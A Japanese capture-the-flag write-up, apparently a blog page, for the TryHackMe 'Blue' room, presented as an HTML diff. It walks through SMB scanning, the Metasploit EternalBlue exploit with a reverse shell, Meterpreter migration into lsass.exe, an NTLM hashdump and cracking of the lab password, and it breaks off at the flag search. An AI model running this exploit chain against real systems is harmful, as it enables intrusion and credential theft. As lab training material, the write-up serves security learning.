@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Blue Writeup</title>
+  <link rel="stylesheet" href="assets/writeup.css">
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Blue</h1>
+    <p>Windows SMBv1 列挙、EternalBlue (MS17-010)、Meterpreter によるフラグ取得。</p>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Easy</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Windows</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+    
+    <article class="writeup-body">
+      <p>疎通を確認</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ ping 10.48.144.95    
+PING 10.48.144.95 (10.48.144.95) 56(84) bytes of data.
+64 bytes from 10.48.144.95: icmp_seq=1 ttl=126 time=130 ms
+64 bytes from 10.48.144.95: icmp_seq=2 ttl=126 time=129 ms
+64 bytes from 10.48.144.95: icmp_seq=3 ttl=126 time=129 ms
+^C
+--- 10.48.144.95 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2003ms
+rtt min/avg/max/mdev = 128.807/129.234/129.890/0.470 ms
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+</code></pre>
+<p>つぎに<code>namp</code>を実施</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nmap 10.48.144.95
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 08:29 +0900
+Nmap scan report for 10.48.144.95
+Host is up (0.13s latency).
+Not shown: 992 closed tcp ports (reset)
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49160/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 4.26 seconds
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+</code></pre>
+<p>これを見て思うことは<br>
+1. 135,139,445,3389,49000番台はwindows特有のものであるということ<br>
+2. SMB(445)が稼働しているということ（狙いやすい）<br>
+3. Room名から「EthernalBlue」をメタ読み</p>
+<p>ということでSMBのバージョンを取りに行く</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nmap 10.48.144.95 -p 445 --script smb-protocols
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 08:37 +0900
+Nmap scan report for 10.48.144.95
+Host is up (0.13s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-protocols: 
+|   dialects: 
+|     NT LM 0.12 (SMBv1) [dangerous, but default]
+|     2.0.2
+|_    2.1
+
+Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─
+</code></pre>
+<p>SMBv1であることが分かった<br>
+おもいっきし[dangerous, but default]と書かれている</p>
+<blockquote>
+<p>[!info]<br>
+「NT LM 0.12」は古い名称であり、「SMBv1」ということがチェックできればよい</p>
+</blockquote>
+<p><code>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</code>と問われている<br>
+これはこのマシンにはどのような脆弱性があるかを答えればよい問題である<br>
+本問においてはnmapの実行結果と問題文から歴史的に有名なSMBの脆弱性であるEthernalBlueを使う問題であることを連想し<br>
+googleなどで「Ethernalblue ms番号」と検索すれば答えがでくる<br>
+例の場合には、2008年に発見された67番目の脆弱性であることを指している</p>
+<p>[追記]<br>
+やっぱりググらない方法を記載しておく</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nmap 10.48.134.187 --script=vuln -p 135,139,445
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 13:17 +0900
+Nmap scan report for 10.48.134.187
+Host is up (0.13s latency).
+
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_smb-vuln-ms10-054: false
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+
+Nmap done: 1 IP address (1 host up) scanned in 26.11 seconds
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+</code></pre>
+<p>これにより<code>ms17-010</code>を得ることが出来た</p>
+<p>つづいてmetasploitを起動していく<br>
+search smb blueを実施した</p>
+<pre><code class="language-bash">msf &gt; search smb blue
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: ETERNALBLUE                          .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: ETERNALBLUE                          .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   Yes    MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: ETERNALBLUE                          .                .        .      .
+   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   28    \_ target: Execute payload (x64)             .                .        .      .
+   29    \_ target: Neutralize implant                .                .        .      .
+   30  exploit/windows/local/cve_2020_0796_smbghost   2020-03-13       good     Yes    SMBv3 Compression Buffer Overflow
+   31    \_ AKA: SMBGhost                             .                .        .      .
+   32    \_ AKA: CoronaBlue                           .                .        .      .
+   33  exploit/windows/smb/cve_2020_0796_smbghost     2020-03-13       average  Yes    SMBv3 Compression Buffer Overflow
+   34    \_ AKA: SMBGhost                             .                .        .      .
+   35    \_ AKA: CoronaBlue                           .                .        .      .
+
+
+Interact with a module by name or index. For example info 35, use 35 or use exploit/windows/smb/cve_2020_0796_smbghost
+
+msf &gt; 
+</code></pre>
+<p>ethernal blueをみつけた<br>
+<code>show options</code>で設定項目を確認する</p>
+<pre><code class="language-bash">msf exploit(windows/smb/ms17_010_eternalblue) &gt; show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Wind
+                                             ows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
+                                             Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded S
+                                             tandard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.1.1.74        yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(windows/smb/ms17_010_eternalblue) &gt; 
+</code></pre>
+<p>RHOSTSがrequiredの中でまだ未設定のようである<br>
+LHOSTも設定しなおしたほうがいい気がする</p>
+<pre><code class="language-bash">msf exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.48.144.95
+RHOSTS =&gt; 10.48.144.95
+msf exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST tun0
+LHOST =&gt; 192.168.205.211
+msf exploit(windows/smb/ms17_010_eternalblue) &gt; show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.48.144.95     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Wind
+                                             ows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
+                                             Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded S
+                                             tandard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.205.211  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(windows/smb/ms17_010_eternalblue) &gt; 
+</code></pre>
+<p><code>set LHOST tun0</code>でいけるらしくて神<br>
+それからmetasploitの場合、自動でリバースシェル取ってきてくれるらしいので別タブでlisten port開けなくてよいらしい<br>
+また、デフォルトの状態ではmeterpreterという高機能なシェルが設定されているがtryhackmeの指示にしたがってこれを変更する</p>
+<pre><code class="language-bash">msf exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/shell/reverse_tcp
+payload =&gt; windows/x64/shell/reverse_tcp
+msf exploit(windows/smb/ms17_010_eternalblue) &gt; show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.48.144.95     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Wind
+                                             ows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
+                                             Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded S
+                                             tandard 7 target machines.
+
+
+Payload options (windows/x64/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.205.211  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(windows/smb/ms17_010_eternalblue) &gt; 
+</code></pre>
+<p>これでwindowsのシェルに変更された<br>
+LHOSTはそのままだ</p>
+<p>では実行する</p>
+<pre><code class="language-bash">msf exploit(windows/smb/ms17_010_eternalblue) &gt; run
+[*] Started reverse TCP handler on 192.168.205.211:4444 
+[*] 10.48.144.95:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.48.144.95:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.26/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 10.48.144.95:445      - Scanned 1 of 1 hosts (100% complete)
+[+] 10.48.144.95:445 - The target is vulnerable.
+[*] 10.48.144.95:445 - Connecting to target for exploitation.
+[+] 10.48.144.95:445 - Connection established for exploitation.
+[+] 10.48.144.95:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.48.144.95:445 - CORE raw buffer dump (42 bytes)
+[*] 10.48.144.95:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.48.144.95:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.48.144.95:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.48.144.95:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.48.144.95:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.48.144.95:445 - Sending all but last fragment of exploit packet
+[*] 10.48.144.95:445 - Starting non-paged pool grooming
+[+] 10.48.144.95:445 - Sending SMBv2 buffers
+[+] 10.48.144.95:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.48.144.95:445 - Sending final SMBv2 buffers.
+[*] 10.48.144.95:445 - Sending last fragment of exploit packet!
+[*] 10.48.144.95:445 - Receiving response from exploit packet
+[+] 10.48.144.95:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.48.144.95:445 - Sending egg to corrupted connection.
+[*] 10.48.144.95:445 - Triggering free of corrupted buffer.
+[*] Sending stage (336 bytes) to 10.48.144.95
+[+] 10.48.144.95:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.48.144.95:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.48.144.95:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] Command shell session 1 opened (192.168.205.211:4444 -&gt; 10.48.144.95:49251) at 2026-05-12 09:31:57 +0900
+
+
+Shell Banner:
+Microsoft Windows [Version 6.1.7601]
+-----
+
+
+C:\Windows\system32&gt;
+</code></pre>
+<p>成功した</p>
+<p>tryhackmeの指示にしたがってセッションは継続させたままバックグラウンドに戻る</p>
+<pre><code class="language-shell">C:\Windows\system32&gt;
+
+C:\Windows\system32&gt;^Z
+Background session 1? [y/N]  y
+msf exploit(windows/smb/ms17_010_eternalblue) &gt; 
+</code></pre>
+<p><code>session 1</code>にセッションが保存され<br>
+つぎの問題を読むと<code>If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</code>とある。これはつまり「現在バックグラウンドで走らせているセッションを標準シェルからmeterpreterに変更するにはどのようなモジュールを使えばよいか」ということである。</p>
+<p>これは調べるとモジュールが出るので設定する</p>
+<pre><code class="language-bash">msf exploit(windows/smb/ms17_010_eternalblue) &gt; use post/multi/manage/shell_to_meterpreter 
+msf post(multi/manage/shell_to_meterpreter) &gt; show options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on
+
+
+View the full module info with the info, or info -d command.
+
+msf post(multi/manage/shell_to_meterpreter) &gt; set SESSION 1
+SESSION =&gt; 1
+msf post(multi/manage/shell_to_meterpreter) &gt; show options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION  1                yes       The session to run this module on
+
+
+View the full module info with the info, or info -d command.
+
+msf post(multi/manage/shell_to_meterpreter) &gt; 
+
+</code></pre>
+<p>ここで1時間の離席が発生したためtargetマシンの立ち上げからやり直す<br>
+<code>sessions</code>で現在開いているセッションを確認できる</p>
+<pre><code class="language-bash">sf post(multi/manage/shell_to_meterpreter) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                                               Connection
+  --  ----  ----               -----------                                               ----------
+  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  192.168.205.211:4444 -&gt; 10.48.144.95:49251 (10.48.144.95)
+
+msf post(multi/manage/shell_to_meterpreter) &gt; 
+</code></pre>
+<p><code>-k</code>オプションを使ってセッションをキルできる</p>
+<pre><code class="language-bash">msf post(multi/manage/shell_to_meterpreter) &gt; sessions -k 1 
+[*] Killing the following session(s): 1
+[*] Killing session 1
+[*] 10.48.144.95 - Command shell session 1 closed.
+msf post(multi/manage/shell_to_meterpreter) &gt; sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf post(multi/manage/shell_to_meterpreter) &gt; 
+</code></pre>
+<p><code>back</code>で戻る</p>
+<pre><code class="language-bash">msf post(multi/manage/shell_to_meterpreter) &gt; back
+msf &gt; 
+</code></pre>
+<p>再度セッションをバックグラウンドに戻すところまでやり<br>
+<code>run</code>する</p>
+<pre><code class="language-bash">msf post(multi/manage/shell_to_meterpreter) &gt; run
+[*] Upgrading session ID: 2
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.205.211:4433 
+[*] Post module execution completed
+msf post(multi/manage/shell_to_meterpreter) &gt; 
+[*] Sending stage (248902 bytes) to 10.48.134.187
+[*] Stopping exploit/multi/handler
+[*] Meterpreter session 3 opened (192.168.205.211:4433 -&gt; 10.48.134.187:49244) at 2026-05-12 11:51:25 +0900
+
+msf post(multi/manage/shell_to_meterpreter) &gt; 
+msf post(multi/manage/shell_to_meterpreter) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                               Connection
+  --  ----  ----                     -----------                                               ----------
+  2         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  192.168.205.211:4444 -&gt; 10.48.134.187:49231 (10.48.134.187)
+  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              192.168.205.211:4433 -&gt; 10.48.134.187:49244 (10.48.134.187)
+
+msf post(multi/manage/shell_to_meterpreter) &gt; 
+</code></pre>
+<p>session 3でmeterpreterによりシェルが開かれた<br>
+<code>NT AUTHORITY\SYSTEM</code>というスーパー権限で入れていることも分かる<br>
+それぞれのセッションで入り<code>whoami</code>を実施した</p>
+<pre><code class="language-bash">msf post(multi/manage/shell_to_meterpreter) &gt; sessions 2
+[*] Starting interaction with 2...
+
+
+Shell Banner:
+Microsoft Windows [Version 6.1.7601]
+-----
+
+
+C:\Windows\system32&gt;
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;^Z
+Background session 2? [y/N]  y
+msf post(multi/manage/shell_to_meterpreter) &gt; sessions 3
+[*] Starting interaction with 3...
+
+meterpreter &gt; whoami
+[-] Unknown command: whoami. Run the help command for more details.
+meterpreter &gt; shell
+Process 916 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;^Z
+Background channel 1? [y/N]  y
+meterpreter &gt; 
+Background session 3? [y/N]  
+msf post(multi/manage/shell_to_meterpreter) &gt; 
+</code></pre>
+<p>どちらもSYSTEM権限で入れている</p>
+<p>ただ、meterpreterというのは「ある1つのプロセス内にDLLとして注入されて動いている」という構造なので<br>
+例えばそのプロセスが閉じられたりクラッシュしたりするとセッションが切れてしまう<br>
+それを会費するためにlsass.exeなどの長命プロセスを引っ越す(migrate)したい。<br>
+まず<code>getpid</code>でいまのプロセスIDを確認して、<code>ps</code>でプロセス一覧を取得する。これらはmeterpreterから実施する。</p>
+<pre><code class="language-bash">meterpreter &gt; getpid
+Current pid: 768
+meterpreter &gt; ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                x64   0
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 548   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 596   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 604   588   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 644   588   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 692   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 700   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 708   596   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 724   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 748   692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+ 768   1520  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ 780   548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 916   768   cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
+ 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 996   548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 1000  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 1060  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1160  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1284  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1320  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1384  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1460  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1600  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1776  816   WmiPrvSE.exe
+ 2056  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 2176  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM
+ 2348  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2444  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 2476  1284  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
+ 2824  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 2856  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2892  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 2968  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
+ 3064  1600  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
+
+meterpreter &gt; 
+
+</code></pre>
+<p>現在はmeterpreterはpowershell.exeプロセスに規制していることが分かった<br>
+AV/EDRが挙動を監視する真っ先の候補でもあるため非常に危険<br>
+移住先としては<code>lsass.exe</code>, <code>services.exe</code>, <code>winlogon.exe</code> などの常駐SYSTEMプロセスなどが考えられる</p>
+<p>tryhackmeの問題としては特に指定されていないが学習目的として<code>lsass.exe</code>に移住してみる</p>
+<pre><code class="language-bash">meterpreter &gt; migrate 700
+[*] Migrating from 768 to 700...
+[*] Migration completed successfully.
+meterpreter &gt; getpid
+Current pid: 700
+meterpreter &gt; 
+</code></pre>
+<p>移住した</p>
+<p>SYSTEM権限でmeterpreterを実行できているので認証情報を奪取する</p>
+<pre><code class="language-bash">meterpreter &gt; hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+meterpreter &gt; 
+</code></pre>
+<p><code>hashdump</code>とはローカルアカウントのNTLMハッシュをSAMから抽出するもの<br>
+これらのファイルは通常は一般ユーザーでは読めないが<br>
+meterpreterではSYSTEM権限と内部APIを使ってレジストリ経由でこれらを取得→メモリ上で複合→ハッシュを抽出する<br>
+<code>ユーザー名：アカウント識別子：LMハッシュ：NTハッシュ</code><br>
+アカウント識別子は、500=Adminstrator、501=Guest、1000以降=作成純のローカルユーザである<br>
+クラック対象は<code>NTハッシュ</code>である。<code>Jon</code>のNTハッシュを<code>hash.txt</code>に保存してローカルkaliで解析する</p>
+<p>まず<code>gunzip rockyou.txt.gz</code>で展開しておく</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/blue]
+└─$ ls /usr/share/wordlists/
+john.lst  metasploit  nmap.lst  rockyou.txt.gz  seclists  sqlmap.txt
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/blue]
+└─$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz 
+[sudo] rkametani のパスワード:
+残念、また試してください。
+[sudo] rkametani のパスワード:
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/blue]
+└─$ ls /usr/share/wordlists/                       
+john.lst  metasploit  nmap.lst  rockyou.txt  seclists  sqlmap.txt
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/blue]
+└─$ 
+</code></pre>
+<p>用意できたのでJohn the Ripperでハッシュをクラックする</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/blue]
+└─$ john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 512/512 AVX512BW 16x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alqfna22         (?)     
+1g 0:00:00:00 DONE (2026-05-12 13:54) 2.380g/s 24287Kp/s 24287Kc/s 24287KC/s alr19882006..alpis3092
+Use the &quot;--show --format=NT&quot; options to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+<p><code>alqfna22</code>というパスワードを得た</p>
+<p>最後にflagを探していく<br>
